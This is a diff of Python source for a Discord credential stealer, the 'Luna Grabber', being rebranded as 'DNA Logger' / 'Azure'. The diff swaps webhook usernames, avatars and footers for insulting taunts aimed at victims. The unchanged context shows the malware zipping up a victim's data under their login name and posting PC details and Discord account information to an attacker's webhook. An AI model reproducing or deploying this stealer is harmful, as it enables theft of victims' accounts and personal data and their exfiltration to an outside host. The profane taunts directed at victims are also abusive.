@@ -60,11 +60,11 @@ def main(webhook: str):
     zipup()
 
     data = {
-        "username": "Luna",
-        "avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096"
+        "username": "AZURE FUCKED YOU",
+        "avatar_url": "https://images-ext-2.discordapp.net/external/mi7_S5q0VDY495_hcMgVBXStVBf3vybCnPE-uEV-uYc/https/media.tenor.com/0FQerhb1qQcAAAPo/ziak-drill.mp4"
     }
 
-    _file = f'{localappdata}\\Luna-Logged-{os.getlogin()}.zip'
+    _file = f'{localappdata}\\Azure-Logged-{os.getlogin()}.zip'
 
     if __CONFIG__["ping"]:
         if __CONFIG__["pingtype"] in ["Everyone", "Here"]:
@@ -224,7 +224,7 @@ class PcInfo:
         data = {
             "embeds": [
                 {
-                    "title": "Luna Logger",
+                    "title": "DNA Logger",
                     "color": 5639644,
                     "fields": [
                         {
@@ -233,15 +233,15 @@ class PcInfo:
                         }
                     ],
                     "footer": {
-                        "text": "Luna Grabber | Created By Smug"
+                        "text": "DNA Logger | SMUG ON TOP"
                     },
                     "thumbnail": {
-                        "url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096"
+                        "url": "https://images-ext-2.discordapp.net/external/mi7_S5q0VDY495_hcMgVBXStVBf3vybCnPE-uEV-uYc/https/media.tenor.com/0FQerhb1qQcAAAPo/ziak-drill.mp4"
                     }
                 }
             ],
-            "username": "Luna",
-            "avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096"
+            "username": "Azure",
+            "avatar_url": "https://images-ext-2.discordapp.net/external/mi7_S5q0VDY495_hcMgVBXStVBf3vybCnPE-uEV-uYc/https/media.tenor.com/0FQerhb1qQcAAAPo/ziak-drill.mp4"
         }
 
         requests.post(webhook, json=data)
@@ -408,12 +408,12 @@ class Discord:
                                         "url": info['ThumbnailUrl']
                                     },
                                     "footer": {
-                                        "text": "Luna Grabber | Created By Smug"
+                                        "text": "DNA Logger | Azure Owns you, SMUG ON TOP"
                                     },
                                 }
                             ],
-                            "username": "Luna",
-                            "avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
+                            "username": "DNA",
+                            "avatar_url": "https://images-ext-2.discordapp.net/external/mi7_S5q0VDY495_hcMgVBXStVBf3vybCnPE-uEV-uYc/https/media.tenor.com/0FQerhb1qQcAAAPo/ziak-drill.mp4",
                         }
                         requests.post(webhook, json=data)
 
@@ -472,12 +472,12 @@ class Discord:
                             "url": avatar_url
                         },
                         "footer": {
-                            "text": "Luna Grabber | Created By Smug"
+                            "text": "DNA Grabber | AZURE RUNS YOU CUNT & SMUG ON TOP"
                         },
                     }
                 ],
-                "username": "Luna",
-                "avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
+                "username": "Azure",
+                "avatar_url": "https://images-ext-2.discordapp.net/external/mi7_S5q0VDY495_hcMgVBXStVBf3vybCnPE-uEV-uYc/https/media.tenor.com/0FQerhb1qQcAAAPo/ziak-drill.mp4",
             }
 
             requests.post(webhook, json=data)
@@ -495,8 +495,8 @@ class Discord:
         image.close()
 
         webhook_data = {
-            "username": "Luna",
-            "avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
+            "username": "GET RAN BY AZURE",
+            "avatar_url": "https://images-ext-2.discordapp.net/external/mi7_S5q0VDY495_hcMgVBXStVBf3vybCnPE-uEV-uYc/https/media.tenor.com/0FQerhb1qQcAAAPo/ziak-drill.mp4",
             "embeds": [
                 {
                     "color": 5639644,
